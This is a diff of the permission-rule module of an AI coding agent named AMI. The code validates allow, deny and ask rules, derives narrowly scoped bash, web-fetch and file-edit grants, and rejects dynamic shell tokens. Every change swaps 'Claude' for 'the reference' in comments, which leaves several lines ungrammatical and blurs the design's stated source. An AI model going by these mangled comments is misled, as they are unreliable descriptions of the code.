  * `generateShellSuggestionsLabel` (shellPermissionHelpers: "Bash strips output
  * redirections so filenames don't show as commands"). Best-effort for display /
  * rule derivation only — it never participates in a security decision.
@@ -4420,7 +4420,7 @@ export function stripOutputRedirections(command: string): string {
  *
  * `--help` forms that route through an unsafe help backend (`man -l`,
  * `git help --web`, …) are excluded — those are not simple `--help` at all and
- * are caught here via {@link detectUnsafeHelpCommand}. Mirrors Claude's
+ * are caught here via {@link detectUnsafeHelpCommand}. Mirrors the reference's
  * `isHelpCommand` (utils/bash/commands.ts), which bypasses prefix extraction so a
  * help command is allowed in full instead of as a too-broad prefix.
  */
@@ -4449,7 +4449,7 @@ export function suggestAllowPrefix(command: string): string | null {
   const cleaned = stripOutputRedirections(command);
   // A simple `--help` command is read-only and safe: offer the FULL command as
   // the allow rule rather than a broad `cmd:*` prefix that would grant arbitrary
-  // execution through the same interpreter. Mirrors Claude's isHelpCommand
+  // execution through the same interpreter. Mirrors the reference's isHelpCommand
   // bypass of prefix extraction (utils/bash/commands.ts).
   if (isHelpCommand(cleaned)) return cleaned.trim();
   // Wrapper-aware derivation: for a wrapped command (`nice -n5 git log`,
@@ -4457,7 +4457,7 @@ export function suggestAllowPrefix(command: string): string | null {
   // BARE_SHELL_PREFIX (`sudo`/`env`/`nice`/…) so the normal path below would refuse
   // to suggest anything. Instead derive the INNER command's prefix and re-compose
   // it with the (bounded, fail-closed) wrapper chain so the grant stays narrowly
-  // scoped to the wrapped form. Mirrors Claude's handleWrapper composed prefix.
+  // scoped to the wrapped form. Mirrors the reference's handleWrapper composed prefix.
   const wrapped = unwrapWrapperChain(cleaned);
   if (wrapped) {
     const innerPrefix = suggestAllowPrefix(wrapped.inner);
@@ -4469,7 +4469,7 @@ export function suggestAllowPrefix(command: string): string | null {
   // the ROOT word is never offered even with a scoped subcommand. Likewise a
   // shell/interpreter root (`bash foo`, `powershell.exe x`, `pwsh something`)
   // must never anchor a scoped prefix — it would auto-allow arbitrary execution
-  // through the shell (Claude's DANGEROUS_SHELL_PREFIXES applied to extraction).
+  // through the shell (the reference's DANGEROUS_SHELL_PREFIXES applied to extraction).
   if (two) {
     const root = two.split(' ')[0]!;
     // A scoped interpreter MODULE-exec form (`python -m http.server`) runs one
@@ -4496,7 +4496,7 @@ export function suggestAllowPrefix(command: string): string | null {
  * This is the compound-aware counterpart to {@link suggestAllowPrefix}: callers
  * seeding "allow always" rules for a compound command MUST use this so a rule is
  * scoped to each mutating subcommand instead of the misleading two-word prefix of
- * the whole chain (e.g. `cd src`). Mirrors Claude's
+ * the whole chain (e.g. `cd src`). Mirrors the reference's
  * `getCompoundCommandPrefixesStatic` (utils/bash/prefix.ts) + per-subcommand
  * rule derivation (BashPermissionRequest `subcommandResults`).
  */
@@ -4505,7 +4505,7 @@ export function suggestAllowPrefix(command: string): string | null {
  * command's permission prompt may suggest. A wide chain (`a && b && c && … && j`)
  * otherwise produces a 10+ rule dump the user has to read through; capping keeps
  * the prompt legible — the user can still allow the rest by re-running or granting
- * a broader rule. Mirrors Claude's `MAX_SUGGESTED_RULES_FOR_COMPOUND` (default 5,
+ * a broader rule. Mirrors the reference's `MAX_SUGGESTED_RULES_FOR_COMPOUND` (default 5,
  * bashPermissions.ts). Applied in {@link buildPermissionSuggestions}.
  */
 export const MAX_SUGGESTED_RULES_FOR_COMPOUND = 5;
@@ -4534,7 +4534,7 @@ export function getCompoundCommandPrefixes(
   // --force` forever). This collapse is the single canonical compound-prefix
   // collapser in {@link collapseCompoundPrefixes} (tools/command-prefix.ts); the
   // grouping is CASE-INSENSITIVE so a PowerShell mixed-case chain (`Git add`+`git
-  // commit`) still collapses to the one `git` group. Mirrors Claude's
+  // commit`) still collapses to the one `git` group. Mirrors the reference's
   // getCompoundCommandPrefixesStatic (staticPrefix.ts L246-284).
   return collapseCompoundPrefixes(prefixes, root => SUBCOMMAND_AWARE_ROOTS.has(root));
 }
@@ -4550,28 +4550,28 @@ export interface PermissionRuleValue {
 }
 
 /**
- * Canonical Claude-Code wire name for the subagent/delegation tool (its current
+ * Canonical the reference wire name for the subagent/delegation tool (its current
  * tool name is `Agent`). AMI's own tool is `task`; a permission rule, hook, or
- * imported Claude settings file that names `Agent(...)` must therefore resolve to
- * AMI's `task` tool. Mirrors Claude Code's `AGENT_TOOL_NAME` (AgentTool/constants.ts).
+ * imported the reference settings file that names `Agent(...)` must therefore resolve to
+ * AMI's `task` tool. Mirrors the reference's `AGENT_TOOL_NAME` (AgentTool/constants.ts).
  */
 export const AGENT_TOOL_NAME = 'Agent';
 /**
- * Legacy Claude-Code wire name for the same tool, kept so a rule written against
- * the OLD spelling still matches (parity: Claude's `LEGACY_AGENT_TOOL_NAME = 'Task'`,
+ * Legacy the reference wire name for the same tool, kept so a rule written against
+ * the OLD spelling still matches (parity: the reference's `LEGACY_AGENT_TOOL_NAME = 'Task'`,
  * retained "for backward compat (permission rules, hooks, resumed sessions)").
  */
 export const LEGACY_AGENT_TOOL_NAME = 'Task';
 
 /**
  * Legacy / cross-framework tool-name aliases → AMI canonical tool names. A
- * permission rule written with a Claude-Code capitalized name (`Bash`, `Edit`)
+ * permission rule written with a reference capitalized name (`Bash`, `Edit`)
  * or an AMI legacy name resolves to the same canonical AMI tool, so rules keep
- * matching after a rename or when imported from a Claude settings file.
+ * matching after a rename or when imported from a reference settings file.
  *
- * Both the CURRENT Claude agent-tool name ({@link AGENT_TOOL_NAME} = `Agent`) and
+ * Both the CURRENT the reference agent-tool name ({@link AGENT_TOOL_NAME} = `Agent`) and
  * its LEGACY spelling ({@link LEGACY_AGENT_TOOL_NAME} = `Task`) map to AMI's `task`
- * tool, so a rule like `Agent(researcher)` imported from a Claude settings file
+ * tool, so a rule like `Agent(researcher)` imported from a reference settings file
  * gates AMI's subagent spawns exactly as `task(researcher)` does.
  */
 export const PERMISSION_TOOL_ALIASES: Record<string, string> = {
@@ -4592,7 +4592,7 @@ export function normalizeToolName(name: string): string {
  * Reverse of {@link normalizeToolName}: given a CANONICAL AMI tool name, return
  * every legacy / cross-framework alias that maps to it (the keys of
  * {@link PERMISSION_TOOL_ALIASES} whose value is `canonicalName`), sorted for
- * stable display. This is the inverse boundary Claude Code exposes as
+ * stable display. This is the inverse boundary the reference exposes as
  * `getLegacyToolNames` (utils/permissions/permissionRuleParser.ts L35-41): a rule
  * written against the current name can be expanded to the historical/aliased
  * spellings, and an introspection / diagnostic surface can tell the user "tool X
@@ -4611,7 +4611,7 @@ export function getLegacyToolNames(canonicalName: string): string[] {
 /** The pattern-syntax class a tool's permission-rule content is written in:
  *  `file` tools take filesystem GLOBS (`*.ts`, `src/**`); `bash` tools take a
  *  command string with free `*` wildcards plus the legacy `command:*` prefix
- *  form. Mirrors Claude Code's toolValidationConfig split (filePatternTools vs
+ *  form. Mirrors the reference's toolValidationConfig split (filePatternTools vs
  *  bashPrefixTools) that drives which pattern syntax is legal per tool. */
 export const TOOL_PATTERN_CLASSES = ['file', 'bash'] as const;
 export type ToolPatternClass = (typeof TOOL_PATTERN_CLASSES)[number];
@@ -4619,7 +4619,7 @@ export type ToolPatternClass = (typeof TOOL_PATTERN_CLASSES)[number];
 /** Canonical-tool-name → pattern-class map (single source of truth for
  *  {@link isFilePatternTool}/{@link isBashPrefixTool}). Keyed by AMI canonical
  *  names; callers pass raw rule tool names through {@link normalizeToolName}
- *  first, so a Claude-spelled `Edit`/`Glob` classifies the same as `file_edit`/
+ *  first, so a reference-spelled `Edit`/`Glob` classifies the same as `file_edit`/
  *  `glob`. Tools absent from the map (`web_fetch`, `web_search`, MCP, `grep`,
  *  …) use their own content validators, not glob/bash-wildcard syntax. Exposed
  *  for the permission introspection surface. */
@@ -4683,7 +4683,7 @@ export function unescapeRuleContent(content: string): string {
 /**
  * Parse a canonical permission-rule string into `{ toolName, ruleContent? }`,
  * honouring escaped parentheses and canonicalizing the tool name. `Tool()` and
- * `Tool(*)` collapse to a tool-wide rule (no ruleContent). Mirrors Claude's
+ * `Tool(*)` collapse to a tool-wide rule (no ruleContent). Mirrors the reference's
  * permissionRuleValueFromString.
  */
 export function permissionRuleValueFromString(ruleString: string): PermissionRuleValue {
@@ -4711,7 +4711,7 @@ export function permissionRuleValueToString(ruleValue: PermissionRuleValue): str
 
 /**
  * Parse an `mcp__server[__tool]` permission-rule tool name into its parts, or
- * `null` when the name is not an MCP rule. Mirrors Claude's `mcpInfoFromString`
+ * `null` when the name is not an MCP rule. Mirrors the reference's `mcpInfoFromString`
  * (services/mcp/mcpStringUtils.ts): the first two `__`-delimited segments are
  * the `mcp` marker and the server name; everything after is re-joined so a tool
  * name containing `__` survives (`mcp__srv__a__b` → tool `a__b`). A missing
@@ -4731,7 +4731,7 @@ export function mcpInfoFromString(
 
 /** Count unescaped occurrences of `char` in `str` (odd preceding backslash run
  *  = escaped). Shared by the MCP rule validator so `mcp__srv\(x\)` is inspected
- *  as a literal, not a pattern. Mirrors Claude's `countUnescapedChar`. */
+ *  as a literal, not a pattern. Mirrors the reference's `countUnescapedChar`. */
 function countUnescapedChar(str: string, char: string): number {
   let count = 0;
   for (let i = 0; i < str.length; i++) {
@@ -4740,7 +4740,7 @@ function countUnescapedChar(str: string, char: string): number {
   return count;
 }
 
-/** The three behaviors a permission rule can carry. Mirrors Claude's
+/** The three behaviors a permission rule can carry. Mirrors the reference's
  *  `permissionBehavior` enum; identical to {@link PermissionRule.action}. */
 export type PermissionBehavior = 'allow' | 'deny' | 'ask';
 
@@ -4748,7 +4748,7 @@ export type PermissionBehavior = 'allow' | 'deny' | 'ask';
  * A structured, declarative mutation of a {@link PermissionManager}'s live rule
  * set / mode / workspace boundary — the canonical representation of "what to
  * change" that a permission prompt, slash command, or hook can hand back as a
- * one-click SUGGESTION (or a batch of them). Mirrors Claude Code's
+ * one-click SUGGESTION (or a batch of them). Mirrors the reference's
  * `PermissionUpdate` discriminated union (utils/permissions/PermissionUpdate.ts
  * + PermissionUpdateSchema.ts):
  *  - `addRules`        — append allow/deny/ask rules to a destination tier;
@@ -4761,7 +4761,7 @@ export type PermissionBehavior = 'allow' | 'deny' | 'ask';
  * `destination` tags which trust tier the change belongs to (the rule `source`,
  * or the directory grant's origin). It is a parity-faithful subset of
  * {@link PERMISSION_UPDATE_DESTINATIONS}. Applying an update is purely in-memory
- * (matching Claude's context transform); persistence is a separate step
+ * (matching the reference's context transform); persistence is a separate step
  * ({@link PermissionManager.saveRulesToDestination}).
  */
 export type PermissionUpdate =
@@ -4781,7 +4781,7 @@ export type PermissionUpdate =
  * `behavior`, a non-array `rules`, a rule whose `ruleContent` is not a string, an
  * empty tool name, a `destination` outside the writable tiers, a bogus `setMode`
  * mode, or a non-string directory) must be REJECTED whole rather than partially
- * applied — a single acceptance boundary mirroring Claude Code's
+ * applied — a single acceptance boundary mirroring the reference's
  * `PermissionUpdateSchema` Zod `discriminatedUnion` with its enum `behavior` /
  * `destination` and typed rule/directory arrays
  * (references/claude/claude-code-main/src/utils/permissions/PermissionUpdateSchema.ts
@@ -4853,7 +4853,7 @@ export function validatePermissionUpdate(update: unknown): { valid: boolean; err
 }
 
 /**
- * The kind of filesystem access a tool call represents — mirrors Claude's
+ * The kind of filesystem access a tool call represents — mirrors the reference's
  * `FileOperationType` (components/permissions/FilePermissionDialog/permissionOptions.tsx):
  * a read-only access, an edit of pre-existing content (`write`), or the creation of
  * a brand-new file (`create`). It drives OPERATION-AWARE permission affordances: a
@@ -4879,7 +4879,7 @@ const FILE_PATH_RULE_TOOLS = new Set([
 ]);
 
 /**
- * Classify a tool call's filesystem operation type (parity with Claude's
+ * Classify a tool call's filesystem operation type (parity with the reference's
  * `operationType`), or `undefined` for a tool that targets no file path. Read-shaped
  * tools are `'read'`; a mutating file tool is `'create'` when its target does not yet
  * exist on disk and `'write'` when it does — so a prompt can distinguish editing
@@ -4904,7 +4904,7 @@ export function resolveFileOperationType(
 /**
  * Which of the agent's own config folders a path lives in: the PROJECT config
  * folder (`<cwd>/.ami` | `.ami-plugin` | `.claude`) or the GLOBAL one
- * (`~/.ami` | `~/.ami-plugin` | `~/.claude`). Mirrors Claude's `isInClaudeFolder` /
+ * (`~/.ami` | `~/.ami-plugin` | `~/.claude`). Mirrors the reference's `isInClaudeFolder` /
  * `isInGlobalClaudeFolder` scope distinction.
  */
 export type ConfigFolderScope = 'project-config-folder' | 'global-config-folder';
@@ -4915,7 +4915,7 @@ export type ConfigFolderScope = 'project-config-folder' | 'global-config-folder'
 const CONFIG_FOLDER_NAMES = ['.ami', '.ami-plugin', '.claude'] as const;
 
 /** True when the already-absolute `child` is `root` itself or nested within it,
- *  case-folded on win32 (case-insensitive FS) like Claude's normalizeCaseForComparison. */
+ *  case-folded on win32 (case-insensitive FS) like the reference's normalizeCaseForComparison. */
 function pathIsWithinDir(child: string, root: string): boolean {
   const fold = (p: string) => (process.platform === 'win32' ? p.toLowerCase() : p);
   const c = fold(path.normalize(child));
@@ -4950,7 +4950,7 @@ function matchConfigFolderRoot(
 
 /**
  * Resolve whether `filePath` lives inside the agent's own config folder (project or
- * global), returning the {@link ConfigFolderScope} or `null`. Mirrors Claude's
+ * global), returning the {@link ConfigFolderScope} or `null`. Mirrors the reference's
  * `isInClaudeFolder` / `isInGlobalClaudeFolder`; used to offer a config-folder-scoped
  * "allow editing own settings this session" grant at permission-decision time.
  */
@@ -4971,7 +4971,7 @@ const SKILL_CONFIG_FOLDER_NAMES = ['.ami', '.claude'] as const;
  * scoped to just that skill dir — instead of the broad `<configRoot>/*` grant that
  * would also hand over settings.json, hooks/, and every OTHER skill. Lets a user
  * iterate on a single skill without granting blanket config-folder access. Mirrors
- * Claude's `getClaudeSkillScope` (utils/permissions/filesystem.ts L101-157), widened
+ * the reference's `getClaudeSkillScope` (utils/permissions/filesystem.ts L101-157), widened
  * to AMI's config folders (`.ami`, `.claude`) and both project + global skill dirs.
  *
  * Returns `null` (caller falls back to the broad config-folder grant) when the path
@@ -5019,7 +5019,7 @@ export function getSkillScopeRule(
 /**
  * Compute the pre-baked {@link PermissionUpdate} *suggestions* to attach to an
  * ask/deny permission decision — the "always allow X" candidates a prompt can
- * offer for one-click acceptance (Claude's `permissionResult.suggestions`, parsed
+ * offer for one-click acceptance (the reference's `permissionResult.suggestions`, parsed
  * by `extractRules`/`extractDirectories`). For a bash call it derives a scoped
  * allow rule per (mutating) subcommand via {@link getCompoundCommandPrefixes}
  * (sharing the single canonical prefix helper — no duplicate heuristic); for a
@@ -5032,7 +5032,7 @@ export function getSkillScopeRule(
 /**
  * Derive the DOMAIN a `web_fetch` call targets, for a domain-scoped "always
  * allow" rule — the URL's lowercased hostname, or `null` when the input carries
- * no usable URL. Parity with Claude's WebFetch `inputToPermissionRuleContent`
+ * no usable URL. Parity with the reference's WebFetch `inputToPermissionRuleContent`
  * (which yields `domain:<hostname>`); AMI's canonical web_fetch rule content is
  * the BARE hostname (`web_fetch(example.com)`) so it matches AMI's existing
  * web_fetch matcher and sandbox-domain extraction — an intentional superset
@@ -5052,7 +5052,7 @@ export function deriveWebFetchDomainRuleContent(input: Record<string, unknown>):
 /**
  * Prefix that marks a permission rule's content as a natural-language "prompt
  * rule" — a human-written DESCRIPTION of what to auto-approve (e.g. "running the
- * test suite"), as opposed to a glob prefix (`git:*`). Parity: Claude's
+ * test suite"), as opposed to a glob prefix (`git:*`). Parity: the reference's
  * `PROMPT_PREFIX` (`utils/permissions/bashClassifier.ts`).
  */
 export const PROMPT_RULE_PREFIX = 'prompt:';
@@ -5062,7 +5062,7 @@ export const PROMPT_RULE_PREFIX = 'prompt:';
  * This is the canonical rule body saved when a user approves a bash command via
  * the "yes, and don't ask again — described as …" classifier path, so the grant
  * is remembered as a reusable natural-language rule rather than a one-off glob.
- * Parity: Claude's `createPromptRuleContent(description)`.
+ * Parity: the reference's `createPromptRuleContent(description)`.
  *
  * DISTINCT from {@link validateAllowedPromptRule}, which guards plan-mode
  * `allowedPrompts` that AMI stores directly AS glob patterns — this codec names
@@ -5081,7 +5081,7 @@ export function isPromptRuleContent(content: string | undefined): boolean {
 /**
  * Recover the human-readable description from prompt-rule content, or `null` when
  * the content is not a prompt rule or carries no description after the prefix.
- * Round-trips {@link createPromptRuleContent}. Parity: Claude's
+ * Round-trips {@link createPromptRuleContent}. Parity: the reference's
  * `extractPromptDescription(ruleContent)`.
  */
 export function extractPromptDescription(content: string | undefined): string | null {
@@ -5097,7 +5097,7 @@ export function extractPromptDescription(content: string | undefined): string | 
  * managed/enterprise policy ({@link isManagedPermissionSource}) — such a rule
  * cannot be edited or removed by the user. Returns `null` for every
  * user-editable source, so a caller can branch on "is this rule locked". Parity:
- * Claude's PermissionRuleList "Rule details" view for `policySettings` rules.
+ * the reference's PermissionRuleList "Rule details" view for `policySettings` rules.
  */
 export function managedRuleReadOnlyNotice(source: PermissionRuleSource | undefined): string | null {
   if (!isManagedPermissionSource(source)) return null;
@@ -5109,7 +5109,7 @@ export function managedRuleReadOnlyNotice(source: PermissionRuleSource | undefin
 
 /**
  * Turn a granted DIRECTORY into a persistable `file_read` allow rule (parity:
- * Claude's `createReadRuleSuggestion`), so "I pointed the agent at this dir" can be
+ * the reference's `createReadRuleSuggestion`), so "I pointed the agent at this dir" can be
  * saved as a normal, scoped permission rule rather than only a runtime read root.
  * Two algorithmic subtleties are mirrored exactly:
  *  - the filesystem root `/` is rejected as far too broad (returns `undefined`); and
@@ -5149,7 +5149,7 @@ export function buildPermissionSuggestions(
     if (!command) return [];
     const rules: PermissionRuleValue[] = getCompoundCommandPrefixes(command)
       // Cap the per-subcommand rule dump so a wide compound command does not
-      // produce an unreadable 10+ rule prompt (Claude's MAX_SUGGESTED_RULES_FOR_COMPOUND).
+      // produce an unreadable 10+ rule prompt (the reference's MAX_SUGGESTED_RULES_FOR_COMPOUND).
       .slice(0, MAX_SUGGESTED_RULES_FOR_COMPOUND)
       .map(prefix => ({ toolName: 'bash', ruleContent: `${prefix}*` }));
     return rules.length > 0
@@ -5158,7 +5158,7 @@ export function buildPermissionSuggestions(
   }
   if (canonical === 'web_fetch') {
     // Domain-scoped "always allow" candidate: grant exactly the URL's host, not a
-    // tool-wide web_fetch allow (least privilege). Parity with Claude's
+    // tool-wide web_fetch allow (least privilege). Parity with the reference's
     // "Yes, and don't ask again for <hostname>" option.
     const domain = deriveWebFetchDomainRuleContent(input);
     return domain
@@ -5167,7 +5167,7 @@ export function buildPermissionSuggestions(
   }
   const filePath = (input.file_path ?? input.path) as unknown;
   if (typeof filePath === 'string' && filePath.length > 0) {
-    // Operation-aware shaping (parity with Claude's operationType): a READ widens
+    // Operation-aware shaping (parity with the reference's operationType): a READ widens
     // the read boundary by directory; a mutating op offers a path allow rule.
     if (resolveFileOperationType(canonical, input) === 'read') {
       const dir = path.dirname(filePath);
@@ -5187,7 +5187,7 @@ export function buildPermissionSuggestions(
     // "allow edits to this skill only" session grant FIRST — scoped to just that one
     // skill dir — so iterating on a skill does not require the blanket config-folder
     // grant below (which would also expose settings.json, hooks/, and other skills).
-    // Mirrors Claude's getClaudeSkillScope skill-scoped addRules suggestion.
+    // Mirrors the reference's getClaudeSkillScope skill-scoped addRules suggestion.
     const skillScope = getSkillScopeRule(filePath, process.cwd());
     if (skillScope) {
       suggestions.push({
@@ -5196,7 +5196,7 @@ export function buildPermissionSuggestions(
       });
     }
     // A write/create inside the agent's OWN config folder also offers a broader,
-    // SESSION-scoped grant for that whole config folder — Claude's config-folder
+    // SESSION-scoped grant for that whole config folder — the reference's config-folder
     // "allow editing its own settings for this session" option — so the user is
     // not re-prompted per settings file. Session-only (never persisted): it widens
     // self-modification rights, which must not survive the process.
@@ -5213,7 +5213,7 @@ export function buildPermissionSuggestions(
     });
     // A one-tap "switch to acceptEdits" affordance for an edit-capable tool, so the
     // user can unblock ALL future edits for the session rather than granting one
-    // path rule at a time (parity: Claude's blocked-write `{ type:'setMode',
+    // path rule at a time (parity: the reference's blocked-write `{ type:'setMode',
     // mode:'acceptEdits' }` suggestion, pathValidation.ts L1792-1798). Offered only
     // for the tools acceptEdits actually auto-allows ({@link ACCEPT_EDITS_EDIT_TOOLS})
     // — it is a no-op for a read or a bash command, which have their own affordances.
@@ -5228,7 +5228,7 @@ export function buildPermissionSuggestions(
 /**
  * Build the model-facing "grant-and-retry" message for a set of just-approved,
  * previously-denied commands, so the agent knows it may re-attempt them. Mirrors
- * Claude's `createPermissionRetryMessage` (utils/messages.ts): the content is
+ * the reference's `createPermissionRetryMessage` (utils/messages.ts): the content is
  * `Allowed <cmd>, <cmd>, …`. Returns an empty-but-valid notice when the list is
  * empty so callers never have to special-case it.
  */
@@ -5242,7 +5242,7 @@ export function createPermissionRetryMessage(commands: string[]): string {
  * that must never be baked into a reusable rule? Returns the offending token kind, or
  * `null` when the pattern is a safe static prefix/glob.
  *
- * Rationale (parity: Claude's `staticPrefix.ts` sanitization, L55-140): a persisted
+ * Rationale (parity: the reference's `staticPrefix.ts` sanitization, L55-140): a persisted
  * allow rule is matched against FUTURE commands, so a dynamic token makes the rule
  * match MORE — or different — commands than the user actually saw and approved:
  *  - a command/arithmetic substitution (`$(...)`, backtick, `${...}`) or a variable
@@ -5261,7 +5261,7 @@ export function dynamicAllowPatternToken(pattern: string | undefined): 'substitu
   if (!pattern) return null;
   for (let i = 0; i < pattern.length; i++) {
     const c = pattern[i]!;
-    // A backslash is an escape/quoting hazard in a persisted glob (Claude rejects
+    // A backslash is an escape/quoting hazard in a persisted glob (the reference rejects
     // backslash path fragments). A trailing lone backslash counts too.
     if (c === '\\') return 'backslash';
     // Backtick command substitution.
@@ -5292,7 +5292,7 @@ export interface PermissionRuleValidationResult {
 /**
  * A per-tool content validator: given the rule's parenthesized CONTENT (never the
  * tool name), return whether it is a well-formed pattern for that specific tool.
- * This is AMI's analogue of Claude's `toolValidationConfig[tool].customValidation`
+ * This is AMI's analogue of the reference's `toolValidationConfig[tool].customValidation`
  * (utils/settings/toolValidationConfig.ts) — a pluggable hook consulted by
  * {@link validatePermissionRule} BEFORE the generic bash/file checks, so a tool
  * whose patterns follow neither bash-prefix nor file-glob syntax (WebFetch domains,
@@ -5305,7 +5305,7 @@ export type ToolContentValidator = (content: string) => PermissionRuleValidation
  * {@link normalizeToolName}). Previously these checks lived as hardcoded `if
  * (toolName === 'web_search')` / `'web_fetch'` branches inside
  * {@link validatePermissionRule}; consolidating them into one pluggable table is
- * the extensibility surface Claude exposes as `getCustomValidation` and AMI lacked
+ * the extensibility surface the reference exposes as `getCustomValidation` and AMI lacked
  * — a new tool's pattern rules are added HERE, in one place, instead of growing the
  * validator with another special case. Consumed via {@link getCustomValidation}.
  */
@@ -5324,12 +5324,12 @@ export const TOOL_CONTENT_VALIDATORS: Readonly<Record<string, ToolContentValidat
   },
   // WebFetch: patterns match a DOMAIN, not a full URL or a URL with a path. AMI
   // uses BARE-domain syntax (`web_fetch(example.com)`) — a deliberate divergence
-  // from Claude's required `domain:` prefix — so a domain that merely starts with
+  // from the reference's required `domain:` prefix — so a domain that merely starts with
   // "http" (e.g. `httpbin.org`) stays valid; only a `scheme://` at the start OR a
   // stray `://` ANYWHERE (a malformed URL whose scheme isn't a clean leading token,
   // e.g. `3http://x`) is rejected, AND a bare domain carrying a `/path` component
   // (`example.com/api/*`) is rejected because matching is domain-only so the path
-  // silently never applies. Mirrors Claude's WebFetch validator (toolValidationConfig.ts).
+  // silently never applies. Mirrors the reference's WebFetch validator (toolValidationConfig.ts).
   web_fetch: (content) => {
     if (/^[a-z][a-z0-9+.-]*:\/\//i.test(content) || content.includes('://')) {
       return {
@@ -5352,8 +5352,8 @@ export const TOOL_CONTENT_VALIDATORS: Readonly<Record<string, ToolContentValidat
 /**
  * The pluggable per-tool content validator for `toolName`, or `undefined` when the
  * tool uses only the generic bash/file-glob pattern checks. The name is
- * canonicalized first, so a Claude-spelled `WebFetch`/`WebSearch` resolves to the
- * same validator as `web_fetch`/`web_search`. Parity with Claude Code's
+ * canonicalized first, so a reference-spelled `WebFetch`/`WebSearch` resolves to the
+ * same validator as `web_fetch`/`web_search`. Parity with the reference's
  * `getCustomValidation` (utils/settings/permissionValidation.ts L137-143).
  */
 export function getCustomValidation(toolName: string): ToolContentValidator | undefined {
@@ -5364,10 +5364,10 @@ export function getCustomValidation(toolName: string): ToolContentValidator | un
  * Validate a user-supplied permission-rule string, returning an actionable
  * diagnostic. Catches empty rules, mismatched / empty parentheses, empty tool
  * names, and bash/file pattern mistakes (`:*` placement, `:*` in file patterns).
- * Mirrors Claude's validatePermissionRule, minus the Claude-specific
+ * Mirrors the reference's validatePermissionRule, minus the reference-specific
  * uppercase-first convention (AMI canonical tool names are lowercase); the
  * per-tool content checks run through the pluggable {@link getCustomValidation}
- * registry (parity with Claude's customValidation hook).
+ * registry (parity with the reference's customValidation hook).
  */
 export function validatePermissionRule(rule: string): {
   valid: boolean; error?: string; suggestion?: string; examples?: string[];
@@ -5412,7 +5412,7 @@ export function validatePermissionRule(rule: string): {
   // (`mcp__server__tool`) — it never carries a parenthesized pattern. Check BOTH
   // the parsed ruleContent AND the raw '(' count, because the parser normalizes a
   // standalone wildcard (`mcp__server(*)`) to a pattern-less name. Mirrors
-  // Claude's permissionValidation MCP branch.
+  // the reference's permissionValidation MCP branch.
   const mcpInfo = mcpInfoFromString(parsed.toolName);
   if (mcpInfo) {
     if (parsed.ruleContent !== undefined || countUnescapedChar(rule, '(') > 0) {
@@ -5452,7 +5452,7 @@ export function validatePermissionRule(rule: string): {
   // File-pattern-tool mistakes (file_read / file_edit / glob / notebook_edit):
   // their rule content is a filesystem GLOB, so the bash-only `:*` prefix form is
   // invalid, and a wildcard that is not at a path boundary usually signals a
-  // confused pattern. Mirrors Claude's permissionValidation file-tool branch
+  // confused pattern. Mirrors the reference's permissionValidation file-tool branch
   // (utils/settings/permissionValidation.ts L199-236).
   if (isFilePatternTool(parsed.toolName) && parsed.ruleContent !== undefined) {
     const content = parsed.ruleContent;
@@ -5487,7 +5487,7 @@ export function validatePermissionRule(rule: string): {
     }
   }
   // Per-tool content validation via the pluggable {@link TOOL_CONTENT_VALIDATORS}
-  // registry (Claude's toolValidationConfig customValidation hook). Consulted for
+  // registry (the reference's toolValidationConfig customValidation hook). Consulted for
   // any tool with a registered validator (WebFetch domains, WebSearch terms, …).
   if (parsed.ruleContent !== undefined) {
     const customValidation = getCustomValidation(parsed.toolName);
@@ -5505,7 +5505,7 @@ export function validatePermissionRule(rule: string): {
  * canonical rejection-text formatter so every surface that shows a dropped/invalid
  * rule (settings loader warnings, the `/permissions` validate command, a config
  * UI) renders it identically — error, then the suggestion (if any), then the
- * examples (if any). Mirrors Claude's `PermissionRuleSchema` superRefine message
+ * examples (if any). Mirrors the reference's `PermissionRuleSchema` superRefine message
  * composition (utils/settings/permissionValidation.ts L244-262), which previously
  * had no AMI equivalent: AMI composed only `error. suggestion` and silently
  * dropped the examples. Returns the bare error for a result with no suggestion or
@@ -5530,7 +5530,7 @@ export function formatPermissionRuleError(result: {
  * one malformed rule cannot poison the whole settings file, and returns a
  * human-readable warning per dropped rule. Fail-open-safe: on any unexpected
  * shape the entry is skipped with a warning rather than throwing. Mirrors
- * Claude's filterInvalidPermissionRules (settings/validation.ts) wording.
+ * the reference's filterInvalidPermissionRules (settings/validation.ts) wording.
  */
 export function filterInvalidPermissionRules(
   rules: unknown,
@@ -5565,7 +5565,7 @@ export const MAX_ALLOWED_PROMPT_LENGTH = 1000;
  * Validate a single MODEL-supplied plan-mode `allowedPrompts` entry before it is
  * persisted as an `allow` permission rule on plan-mode exit.
  *
- * Claude's ExitPlanMode tool treats `allowedPrompts` as SCOPED action
+ * the reference's ExitPlanMode tool treats `allowedPrompts` as SCOPED action
  * descriptions (`tool: z.enum(['Bash'])`, e.g. "run tests") — never a match-all
  * glob. AMI stores each entry's text directly as a rule pattern
  * (`addRule({ tool, pattern: prompt, action: 'allow' })`), so without this guard
@@ -5625,10 +5625,10 @@ export function partitionAllowedPromptRules<T extends { prompt?: unknown }>(
  * never *broaden* an allow into auto-approving an obfuscated command.
  */
 /**
- * Extract the COMMAND PREFIX from a bash rule content written in Claude's `:*`
+ * Extract the COMMAND PREFIX from a bash rule content written in the reference's `:*`
  * prefix convention (`git commit:*` → `git commit`, `npm:*` → `npm`), or `null`
  * when the content is not a prefix rule (no trailing `:*`, or nothing before it).
- * Mirrors Claude's `permissionRuleExtractPrefix` (shellPermissionHelpers.ts
+ * Mirrors the reference's `permissionRuleExtractPrefix` (shellPermissionHelpers.ts
  * L76-84). AMI's rule validator already BLESSES this form
  * ({@link validatePermissionRule} accepts `bash(git:*)` and even suggests it as
  * the canonical example) and {@link permissionRuleValueFromString} preserves the
@@ -5644,7 +5644,7 @@ export function permissionRuleExtractPrefix(ruleContent: string): string | null 
 }
 
 /**
- * True when `command` is covered by a rule prefix (Claude's `:*` convention): the
+ * True when `command` is covered by a rule prefix (the reference's `:*` convention): the
  * command equals the prefix exactly, or starts with the prefix followed by a space
  * (its arguments). Anchored on a word boundary so `ls:*` matches `ls -la` and bare
  * `ls` but NOT `lsof` (a different command that merely shares the leading letters).
@@ -5660,13 +5660,13 @@ function matchBashSub(pattern: string, sub: string, ruleAction: 'allow' | 'deny'
   // match → prompt); deny/ask rules strip ALL env vars so no prefix can hide a
   // denied command.
   const strippedRaw = stripEnvVarPrefix(sub, /* safeEnvOnly */ ruleAction === 'allow');
-  // Claude `cmd:*` prefix convention (validated + stored but previously unmatched):
+  // the reference `cmd:*` prefix convention (validated + stored but previously unmatched):
   // a `prefix:*` rule grants/denies the command prefix plus any arguments. Checked
   // ahead of the glob match because `:` is otherwise a literal glob character.
   const rulePrefix = permissionRuleExtractPrefix(pattern);
